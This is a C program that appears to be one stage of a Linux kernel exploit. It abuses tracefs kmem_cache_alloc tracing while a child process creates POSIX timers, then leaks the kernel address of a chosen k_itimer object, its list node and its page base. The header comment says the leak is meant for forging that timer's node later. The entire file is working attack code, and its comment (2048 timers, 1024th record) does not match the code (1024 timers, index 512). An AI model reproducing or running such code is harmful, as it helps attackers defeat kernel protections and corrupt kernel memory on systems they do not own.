/*
 * victim - learn the kernel address of the armed timer's k_itimer object by
 * reading the kmem_cache_alloc records produced while the child creates 2048
 * timers. The 1024th record is the timer whose node we later forge.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <time.h>

#define T "/sys/kernel/tracing"
#define N_TIMERS 1024
#define ARMED 512
#define KVA 0xffff000000000000ULL

static char *g_buf; static size_t g_cap = 32u << 20, g_used;
static pthread_mutex_t g_mu = PTHREAD_MUTEX_INITIALIZER;
static int g_fds[16], g_nfds;

static void *reader(void *arg)
{
    int fd = (int)(intptr_t)arg; char tmp[65536];
    for (;;) {
        ssize_t n = read(fd, tmp, sizeof(tmp));
        if (n <= 0) break;
        pthread_mutex_lock(&g_mu);
        if (g_used + (size_t)n < g_cap) { memcpy(g_buf + g_used, tmp, (size_t)n); g_used += (size_t)n; }
        pthread_mutex_unlock(&g_mu);
    }
    return NULL;
}
static int wf(const char *p, const char *v) { int fd = open(p, O_WRONLY); ssize_t n; if (fd < 0) return -1; n = write(fd, v, strlen(v)); close(fd); return n > 0 ? 0 : -1; }
static int wfa(const char *p, const char *v) { int fd = open(p, O_WRONLY | O_APPEND); ssize_t n; if (fd < 0) return -1; n = write(fd, v, strlen(v)); close(fd); return n > 0 ? 0 : -1; }

static void noop(int s) { (void)s; }

int main(void)
{
    pthread_t th[16]; int i; pid_t child;
    struct itimerspec its;

    g_buf = malloc(g_cap); if (!g_buf) return 1;
    printf("=== victim address collector ===\n");

    wfa(T "/events/kmem/rss_stat/trigger", "enable_event:kmem:kmem_cache_alloc\n");
    wf(T "/buffer_size_kb", "16384\n");
    wf(T "/tracing_on", "0\n");
    { int fd = open(T "/trace", O_WRONLY | O_TRUNC); if (fd >= 0) close(fd); }
    wf(T "/tracing_on", "1\n");
    { size_t n = 8u << 20; char *m = malloc(n); if (m) { memset(m, 0x5a, n); free(m); } }  /* kick rss_stat */

    for (i = 0; i < 16; i++) {
        char p[128];
        snprintf(p, sizeof(p), T "/per_cpu/cpu%d/trace_pipe_raw", i);
        g_fds[g_nfds] = open(p, O_RDONLY);
        if (g_fds[g_nfds] < 0) break;
        pthread_create(&th[g_nfds], NULL, reader, (void *)(intptr_t)g_fds[g_nfds]);
        g_nfds++;
    }
    printf("raw pipes: %d\n", g_nfds);

    child = fork();
    if (child == 0) {
        static timer_t many[N_TIMERS];
        struct sigevent plain, ae; struct sigaction sa; int k;
        int dn = open("/dev/null", O_WRONLY);
        if (dn >= 0) { dup2(dn, 1); dup2(dn, 2); if (dn > 2) close(dn); }
        memset(&sa, 0, sizeof(sa)); sa.sa_handler = noop; sigaction(SIGRTMIN, &sa, NULL);
        memset(&plain, 0, sizeof(plain)); plain.sigev_notify = SIGEV_NONE;
        memset(&ae, 0, sizeof(ae)); ae.sigev_notify = SIGEV_SIGNAL; ae.sigev_signo = SIGRTMIN;
        for (k = 0; k < N_TIMERS; k++)
            timer_create(CLOCK_THREAD_CPUTIME_ID, k == ARMED ? &ae : &plain, &many[k]);
        memset(&its, 0, sizeof(its)); its.it_value.tv_sec = 3600;
        timer_settime(many[ARMED], 0, &its, NULL);
        for (;;) pause();
    }
    usleep(300000);
    wf(T "/tracing_on", "0\n");
    for (i = 0; i < g_nfds; i++) { close(g_fds[i]); pthread_join(th[i], NULL); }
    printf("captured %zu bytes\n", g_used);

    {
        int n = 0, nth = 0; uint64_t chosen = 0;
        const uint64_t site = 0xffffffd6401a726cULL;   /* do_timer_create+0x350 */
        size_t off;
        for (off = 0; off + 32 <= g_used; off++) {
            uint64_t cs, ptr, sz;
            if (memcmp(g_buf + off, &site, 8)) continue;
            memcpy(&cs, g_buf + off, 8);
            memcpy(&ptr, g_buf + off + 8, 8);
            memcpy(&sz, g_buf + off + 24, 8);
            if (cs != site || sz != 0x180) continue;
            if (ptr < KVA || (ptr & 7)) continue;
            if (n == ARMED && !chosen) { chosen = ptr; nth = 1; }
            n++;
        }
        printf("k_itimer allocations seen: %d   chosen(#%d)=%#llx\n", n, ARMED, (unsigned long long)chosen);
        if (chosen) {
            printf("  victim object  = 0x%016llx\n", (unsigned long long)chosen);
            printf("  node (+0xe0)   = 0x%016llx\n", (unsigned long long)(chosen + 0xe0));
            printf("  page base      = 0x%016llx\n", (unsigned long long)(chosen & ~0xfffULL));
            printf("  page offset    = 0x%03llx\n", (unsigned long long)(chosen & 0xfffULL));
        }
    }
    kill(child, SIGKILL); { int st; waitpid(child, &st, 0); }
    return 0;
}
